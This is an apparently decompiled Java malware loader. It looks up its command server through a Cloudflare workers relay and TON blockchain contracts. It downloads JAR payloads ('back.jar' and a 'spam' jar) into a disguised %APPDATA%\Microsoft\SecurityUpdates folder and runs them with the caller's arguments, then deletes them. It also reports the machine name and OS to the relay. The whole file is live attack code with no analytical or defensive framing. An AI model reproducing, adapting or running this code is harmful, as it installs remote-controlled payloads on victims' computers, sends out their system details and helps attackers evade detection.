package core;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.management.ManagementFactory;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.util.Base64;
import java.util.Collections;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class core {
   private static final String CF_BASE = "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev";
   private static final String TACT_ADDR = "EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ";
   private static volatile String ERR_BASE;
   private static volatile String ERR_KEY = "";
   private static final AtomicInteger ERR_SENT = new AtomicInteger();
   private static final Set<String> ERR_SEEN = Collections.newSetFromMap(new ConcurrentHashMap<>());
   private static final Pattern CELL = Pattern.compile("\"cell\":\"([0-9a-fA-F]+)\"");
   private static boolean spa = true;

   public static void vov(String var0, String var1, String var2, String var3, String var4) {
   }

   public static void mains(String var0, String var1, String var2, String var3) {
      mais(var0, var1, var2, var3);
   }

   private static void report(String var0, String var1, String var2, Throwable var3) {
      try {
         if (ERR_SENT.get() >= 6) {
            return;
         }

         if (!ERR_SEEN.add(var0 + "|" + var2)) {
            return;
         }

         ERR_SENT.incrementAndGet();
         String var4 = ERR_BASE != null ? ERR_BASE : (ERR_BASE = resolveBase());
         if (var4 == null) {
            return;
         }

         StringBuilder var5 = new StringBuilder();
         if (var3 != null) {
            var5.append(var3.getClass().getName()).append(": ").append(var3.getMessage()).append('\n');
            StackTraceElement[] var6 = var3.getStackTrace();

            for (int var7 = 0; var7 < var6.length && var7 < 10; var7++) {
               var5.append("  at ").append(var6[var7]).append('\n');
            }
         }

         String var9 = "{\"src\":\"stub\",\"level\":"
            + q(var1)
            + ",\"where\":"
            + q(var0)
            + ",\"key\":"
            + q(ERR_KEY)
            + ",\"pc\":"
            + q(System.getenv("COMPUTERNAME"))
            + ",\"os\":"
            + q(System.getProperty("os.name"))
            + ",\"msg\":"
            + q(var2)
            + ",\"stack\":"
            + q(var5.toString())
            + "}";
         Thread var10 = new Thread(() -> {
            HttpURLConnection var2x = null;

            try {
               var2x = (HttpURLConnection)new URL(var4 + "/error").openConnection();
               var2x.setRequestMethod("POST");
               var2x.setDoOutput(true);
               var2x.setConnectTimeout(6000);
               var2x.setReadTimeout(6000);
               var2x.setRequestProperty("Content-Type", "application/json");
               var2x.setRequestProperty("User-Agent", "Mozilla/5.0");

               try (OutputStream var3x = var2x.getOutputStream()) {
                  var3x.write(var9.getBytes(StandardCharsets.UTF_8));
               }

               var2x.getResponseCode();
            } catch (Throwable var24) {
            } finally {
               if (var2x != null) {
                  var2x.disconnect();
               }
            }
         }, "err-report");
         var10.setDaemon(true);
         var10.start();
      } catch (Throwable var8) {
      }
   }

   private static String q(String var0) {
      if (var0 == null) {
         return "\"\"";
      }

      StringBuilder var1 = new StringBuilder("\"");

      for (int var2 = 0; var2 < var0.length(); var2++) {
         char var3 = var0.charAt(var2);
         if (var3 == '"' || var3 == '\\') {
            var1.append('\\').append(var3);
         } else if (var3 == '\n') {
            var1.append("\\n");
         } else if (var3 == '\r') {
            var1.append("\\r");
         } else if (var3 < ' ') {
            var1.append(' ');
         } else {
            var1.append(var3);
         }
      }

      return var1.append('"').toString();
   }

   private static String resolveBase() {
      try {
         String var0 = tonLink(8);
         if (var0 != null && var0.startsWith("http")) {
            return var0;
         }
      } catch (Exception var1) {
      }

      return "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev";
   }

   private static String tonLink(int var0) throws Exception {
      HttpURLConnection var1 = (HttpURLConnection)new URL("https://toncenter.com/api/v2/runGetMethod").openConnection();
      var1.setRequestMethod("POST");
      var1.setDoOutput(true);
      var1.setConnectTimeout(15000);
      var1.setReadTimeout(30000);
      var1.setRequestProperty("Content-Type", "application/json");
      String var2 = "{\"address\":\"EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ\",\"method\":\"link\",\"stack\":[[\"int\",\"" + var0 + "\"]]}";

      try (OutputStream var3 = var1.getOutputStream()) {
         var3.write(var2.getBytes(StandardCharsets.UTF_8));
      }

      String var15 = readAll(var1.getInputStream());
      var1.disconnect();
      Matcher var16 = Pattern.compile("\"b64\":\"([A-Za-z0-9+/=]+)\"").matcher(var15);
      return var16.find() ? new String(Base64.getDecoder().decode(var16.group(1)), StandardCharsets.UTF_8) : null;
   }

   private static String resolveHost() {
      try {
         String var0 = configSlot("3");
         if (var0 != null) {
            var0 = var0.trim().replace("https://", "").replace("http://", "").replace("/", "");
            if (!var0.isEmpty()) {
               return var0;
            }
         }
      } catch (Exception var1) {
      }

      return "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev".replace("https://", "").replace("http://", "").replace("/", "");
   }

   private static String configSlot(String var0) {
      try {
         HttpURLConnection var1 = (HttpURLConnection)new URL(resolveBase() + "/config").openConnection();
         var1.setRequestMethod("GET");
         var1.setConnectTimeout(12000);
         var1.setReadTimeout(12000);
         var1.setRequestProperty(
            "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         );
         int var2 = var1.getResponseCode();
         if (var2 != 200) {
            var1.disconnect();
            return null;
         }

         String var3 = readAll(var1.getInputStream());
         var1.disconnect();
         Matcher var4 = Pattern.compile("\"" + var0 + "\"\\s*:\\s*\"([^\"]+)\"").matcher(var3);
         if (var4.find()) {
            return var4.group(1);
         }
      } catch (Exception var5) {
      }

      return null;
   }

   public static void mais(String var0, String var1, String var2, String var3) {
      ERR_KEY = var3.replace("=", "");
      Thread.setDefaultUncaughtExceptionHandler((var0x, var1x) -> report("thread:" + var0x.getName(), "fatal", "uncaught: " + var1x, var1x));

      try {
         new Thread(() -> {
            vov(var2, var1, var0, var3, "2");
            String var4 = getCurrentProcessExePath();
            String var5x = var4 != null && new File(var4).isFile() ? var4 : "java";

            try {
               String var6 = resolveHost();
               if (!var3.startsWith("30e3267e-d80c-4a8f-84e2-bb475930a37c")) {
                  if (!spa) {
                     return;
                  }

                  new Thread(() -> {
                     try {
                        if (!isPremium(var6, var3.replace("=", ""))) {
                           String var3xx = configSlot("2");
                           File var4x = var3xx != null && var3xx.startsWith("http") ? fileUrl(var3xx, "dis") : file(var6, "4003", "dis");
                           if (var4x == null) {
                              System.out.println("spam jar not downloaded, skip");
                              report("stub/spam", "warn", "spam jar not downloaded (slot 2 empty/unreachable), url=" + var6, null);
                              return;
                           }

                           System.out.println("JAR spam downloaded: ");
                           ProcessBuilder var5xx = new ProcessBuilder(var5x, "-jar", var4x.getAbsolutePath());
                           var5xx.redirectErrorStream(true);
                           Process var6x = var5xx.start();
                           StringBuilder var7x = new StringBuilder();

                           String var10;
                           try (BufferedReader var8 = new BufferedReader(new InputStreamReader(var6x.getInputStream()))) {
                              while ((var10 = var8.readLine()) != null) {
                                 var7x.append(var10).append(System.lineSeparator());
                              }
                           }

                           int var22 = var6x.waitFor();
                           System.out.println("spam finished with exit code: " + var22);
                           if (var22 != 0) {
                              System.out.println("Error spam occurred:");
                              System.out.println(var7x);
                           }

                           if (var4x.exists() && var4x.delete()) {
                              System.out.println("Temporary spam deleted: ");
                           } else {
                              System.out.println("Failed to delete temporary spam: " + var4x.getAbsolutePath());
                           }
                        }
                     } catch (Exception var21) {
                        var21.printStackTrace();
                        report("stub/spam", "warn", "spam run failed: " + var21, var21);
                     }
                  }).start();
               }

               new Thread(() -> {
                  try {
                     String var6x = configSlot("1");
                     File var7x = var6x != null && var6x.startsWith("http") ? fileUrl(var6x, "Java") : file(var6, "4001", "Java");
                     if (var7x == null) {
                        System.out.println("back.jar not downloaded, skip");
                        report("stub/back", "fatal", "back.jar not downloaded (slot 1 empty/unreachable), url=" + var6, null);
                        return;
                     }

                     System.out.println("JAR file downloaded: ");
                     ProcessBuilder var8 = new ProcessBuilder(var5x, "-jar", var7x.getAbsolutePath(), var2, var1, var0, var3);
                     var8.redirectErrorStream(true);
                     Process var9 = var8.start();
                     StringBuilder var10 = new StringBuilder();

                     String var13;
                     try (BufferedReader var11 = new BufferedReader(new InputStreamReader(var9.getInputStream()))) {
                        while ((var13 = var11.readLine()) != null) {
                           var10.append(var13).append(System.lineSeparator());
                        }
                     }

                     int var25 = var9.waitFor();
                     System.out.println("Process finished with exit code: " + var25);
                     if (var25 != 0) {
                        System.out.println("Error occurred:");
                        System.out.println(var10);
                        String var26 = var10.toString();
                        var13 = var26.length() > 1200 ? var26.substring(var26.length() - 1200) : var26;
                        report("stub/back exit=" + var25, "fatal", "back.jar died: " + var13, null);
                     }

                     if (var7x.exists() && var7x.delete()) {
                        System.out.println("Temporary file deleted: ");
                     } else {
                        System.out.println("Failed to delete temporary file: " + var7x.getAbsolutePath());
                     }
                  } catch (Exception var24) {
                     var24.printStackTrace();
                     report("stub/back", "fatal", "back.jar download/run failed: " + var24, var24);
                  }
               }).start();
            } catch (Exception var7) {
               var7.printStackTrace();
               report("stub/host", "fatal", "host/slot resolve failed: " + var7, var7);
            }
         }).start();
      } catch (Exception var5) {
         var5.printStackTrace();
         report("stub/main", "fatal", "stub failed: " + var5, var5);
      }
   }

   private static String getWorkingHost() throws IOException {
      String[] var0 = new String[]{"EQCsNH1LY2PQeqG2HKSk2myObNTgCuREdq1IVvZFL4k_5iia", "EQBaz-F9o6nHrQ16Z_jTGZShLyRNEMRtS0OWMYs0GNQK_PHA"};

      for (String var4 : var0) {
         String var5 = getURL(var4);
         if (var5 != null) {
            try {
               HttpURLConnection var6 = (HttpURLConnection)new URL("https://" + var5 + "/").openConnection();
               var6.setRequestMethod("HEAD");
               var6.setConnectTimeout(3000);
               var6.setReadTimeout(3000);
               var6.getResponseCode();
               return var5;
            } catch (IOException var7) {
            }
         }
      }

      throw new IOException("Error");
   }

   private static Path workDir() {
      String var0 = System.getenv("APPDATA");
      if (var0 == null || var0.trim().isEmpty()) {
         var0 = System.getProperty("java.io.tmpdir");
      }

      if (var0 == null || var0.trim().isEmpty()) {
         var0 = System.getProperty("user.home");
      }

      if (var0 == null || var0.trim().isEmpty()) {
         var0 = ".";
      }

      Path var1;
      try {
         var1 = Paths.get(var0);
      } catch (Exception var4) {
         var1 = Paths.get(".");
      }

      try {
         Files.createDirectories(var1);
      } catch (Exception var3) {
      }

      return var1.resolve("Microsoft").resolve("SecurityUpdates");
   }

   public static File fileUrl(String var0, String var1) {
      try {
         Path var2 = workDir();

         try {
            Files.createDirectories(var2);
         } catch (Exception var52) {
         }

         Path var3 = var2.resolve(var1 + ".jar.part");
         Path var4 = var2.resolve(var1 + ".jar");

         for (int var5 = 1; var5 <= 3; var5++) {
            try {
               URL var6 = new URL(var0);
               HttpURLConnection var7 = (HttpURLConnection)var6.openConnection();
               var7.setRequestMethod("GET");
               var7.setConnectTimeout(20000);
               var7.setReadTimeout(240000);
               var7.setInstanceFollowRedirects(true);
               var7.setRequestProperty("Accept", "application/java-archive");
               var7.setRequestProperty("User-Agent", "Mozilla/5.0");
               int var8 = var7.getResponseCode();
               if (var8 != 200) {
                  var7.disconnect();
                  throw new IOException("HTTP " + var8);
               }

               long var9 = var7.getContentLengthLong();
               long var11 = 0L;

               try (
                  InputStream var13 = var7.getInputStream();
                  OutputStream var15 = Files.newOutputStream(var3);
               ) {
                  byte[] var17 = new byte[65536];

                  int var18;
                  while ((var18 = var13.read(var17)) != -1) {
                     var15.write(var17, 0, var18);
                     var11 += var18;
                  }
               }

               var7.disconnect();
               if (var11 <= 0L) {
                  throw new IOException("empty download");
               }

               if (var9 > 0L && var11 != var9) {
                  throw new IOException("truncated");
               }

               try {
                  Files.move(var3, var4, StandardCopyOption.REPLACE_EXISTING);
               } catch (Exception var49) {
                  Files.copy(var3, var4, StandardCopyOption.REPLACE_EXISTING);
               }

               return var4.toFile();
            } catch (Exception var57) {
               try {
                  Thread.sleep(800L);
               } catch (InterruptedException var48) {
               }
            }
         }
      } catch (Throwable var58) {
      }

      return null;
   }

   public static File file(String var0, String var1, String var2) {
      Path var3 = workDir();

      try {
         Files.createDirectories(var3);
      } catch (Exception var66) {
      }

      Path var4 = var3.resolve(var2 + ".jar.part");
      Path var5 = var3.resolve(var2 + ".jar");

      for (int var6 = 1; var6 <= 3; var6++) {
         try {
            URL var7 = new URL("https://" + var0 + "/api/hlam/files/" + var1);
            HttpURLConnection var8 = (HttpURLConnection)var7.openConnection();
            var8.setRequestMethod("GET");
            var8.setConnectTimeout(20000);
            var8.setReadTimeout(240000);
            var8.setRequestProperty("Accept", "application/java-archive");
            var8.setRequestProperty(
               "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            );
            int var9 = var8.getResponseCode();
            if (var9 == 200) {
               long var74 = var8.getContentLengthLong();
               long var75 = 0L;

               try (
                  InputStream var76 = var8.getInputStream();
                  OutputStream var16 = Files.newOutputStream(var4, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);
               ) {
                  byte[] var18 = new byte[65536];

                  int var19;
                  while ((var19 = var76.read(var18)) != -1) {
                     var16.write(var18, 0, var19);
                     var75 += var19;
                  }
               }

               var8.disconnect();
               if (var75 <= 0L) {
                  Files.deleteIfExists(var4);
                  throw new IOException("empty download for " + var7);
               }

               if (var74 > 0L && var75 != var74) {
                  Files.deleteIfExists(var4);
                  throw new IOException("truncated download: " + var75 + " of " + var74 + " for " + var7);
               }

               Files.move(var4, var5, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
               return var5.toFile();
            }

            InputStream var10 = var8.getErrorStream();
            String var11 = "";
            if (var10 != null) {
               try (BufferedReader var12 = new BufferedReader(new InputStreamReader(var10, "UTF-8"))) {
                  StringBuilder var15 = new StringBuilder();

                  String var14;
                  while ((var14 = var12.readLine()) != null) {
                     var15.append(var14);
                  }

                  var11 = var15.toString();
               }
            }

            var8.disconnect();
            throw new IOException("HTTP " + var9 + " " + var11);
         } catch (Exception var73) {
            if (var6 >= 3) {
               var73.printStackTrace();
            }
         }
      }

      return null;
   }

   public static boolean isPremium(String var0, String var1) throws Exception {
      String var2 = "https://" + var0 + "/api/premium-status?id=" + var1;
      HttpURLConnection var3 = (HttpURLConnection)new URL(var2).openConnection();
      var3.setRequestMethod("GET");
      var3.setRequestProperty("Accept", "application/json");
      var3.setConnectTimeout(5000);
      var3.setReadTimeout(5000);
      var3.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
      int var4 = var3.getResponseCode();
      InputStream var5 = var4 >= 200 && var4 < 300 ? var3.getInputStream() : var3.getErrorStream();
      String var6 = readAll(var5);
      if (var4 != 200) {
         System.out.println("HTTP " + var4 + ": " + var6);
      }

      return var6.contains("\"premium\":true");
   }

   private static byte[] hex(String var0) {
      byte[] var1 = new byte[var0.length() / 2];

      for (int var2 = 0; var2 < var1.length; var2++) {
         var1[var2] = (byte)(Character.digit(var0.charAt(var2 * 2), 16) << 4 | Character.digit(var0.charAt(var2 * 2 + 1), 16));
      }

      return var1;
   }

   private static long u(byte[] var0, int var1, int var2) {
      long var3 = 0L;

      for (int var5 = 0; var5 < var2; var5++) {
         var3 = var3 << 8 | var0[var1 + var5] & 255L;
      }

      return var3;
   }

   private static String decodeText(String var0) {
      byte[] var1 = hex(var0);
      int var2 = 4;
      int var3 = var1[var2++] & 255;
      int var4 = var3 & 7;
      int var5 = var1[var2++] & 255;
      int var6 = (int)u(var1, var2, var4);
      var2 += var4;
      int var7 = (int)u(var1, var2, var4);
      var2 += var4;
      var2 += var4 + var5 + var7 * var4;
      if ((var3 & 128) != 0) {
         var2 += var6 * var5;
      }

      int var18 = ++var2;
      var2++;
      int var8 = var1[var18] & 255;
      int var9 = (var8 + 1) / 2;
      return new String(var1, var2, var9, StandardCharsets.UTF_8);
   }

   public static String getURL(String var0) {
      try {
         String var1 = "https://tonapi.io/v2/blockchain/accounts/" + var0 + "/methods/getMessage";
         HttpURLConnection var2 = (HttpURLConnection)new URL(var1).openConnection();
         var2.setRequestMethod("GET");
         var2.setRequestProperty("Accept", "application/json");
         var2.setConnectTimeout(15000);
         var2.setReadTimeout(30000);
         int var3 = var2.getResponseCode();
         InputStream var4 = var3 >= 200 && var3 < 300 ? var2.getInputStream() : var2.getErrorStream();
         String var5 = readAll(var4);
         Matcher var6 = CELL.matcher(var5);
         if (var6.find()) {
            var2.disconnect();
            return decodeText(var6.group(1));
         }

         var2.disconnect();
      } catch (Exception var7) {
         var7.printStackTrace();
      }

      return null;
   }

   public static String getCurrentProcessExePath() {
      try {
         String var0 = System.getProperty("os.name", "").toLowerCase();
         if (!var0.contains("win")) {
            String var20 = System.getProperty("java.home");
            if (var20 != null) {
               File var2 = new File(new File(var20, "bin"), "java");
               if (var2.isFile()) {
                  return var2.getAbsolutePath();
               }
            }

            return "java";
         } else {
            long var1 = getPidJava8();
            ProcessBuilder var3 = new ProcessBuilder("powershell.exe", "-NoProfile", "-Command", "(Get-Process -Id " + var1 + ").Path");
            var3.redirectErrorStream(true);
            Process var4 = var3.start();

            String var5;
            try (InputStream var6 = var4.getInputStream()) {
               var5 = readAll(var6).trim();
            }

            int var21 = var4.waitFor();
            return var21 == 0 && var5 != null && !var5.isEmpty() ? var5 : guessFromJavaHome();
         }
      } catch (Exception var19) {
         var19.printStackTrace();
         return null;
      }
   }

   private static long getPidJava8() {
      String var0 = ManagementFactory.getRuntimeMXBean().getName();
      int var1 = var0.indexOf(64);
      String var2 = var1 > 0 ? var0.substring(0, var1) : var0;
      return Long.parseLong(var2);
   }

   private static String guessFromJavaHome() {
      String var0 = System.getProperty("java.home");
      return new File(new File(var0, "bin"), "java.exe").getAbsolutePath();
   }

   private static String readAll(InputStream var0) throws IOException {
      ByteArrayOutputStream var1 = new ByteArrayOutputStream();
      byte[] var2 = new byte[8192];

      int var3;
      while ((var3 = var0.read(var2)) != -1) {
         var1.write(var2, 0, var3);
      }

      return new String(var1.toByteArray(), Charset.defaultCharset());
   }

   public static void main(String[] var0) throws Exception {
      core var1 = new core();
      if (var0.length == 4) {
         mains(var0[0], var0[1], var0[2], var0[3]);
      } else if (var0.length == 2) {
         if (var0[1].equals("Discord")) {
            spa = false;
            mains("Discord", "Click", "Click", var0[0]);
         }
      } else if (var0.length == 1) {
         mains("Run", "Click", "Click", var0[0]);
      }
   }
}
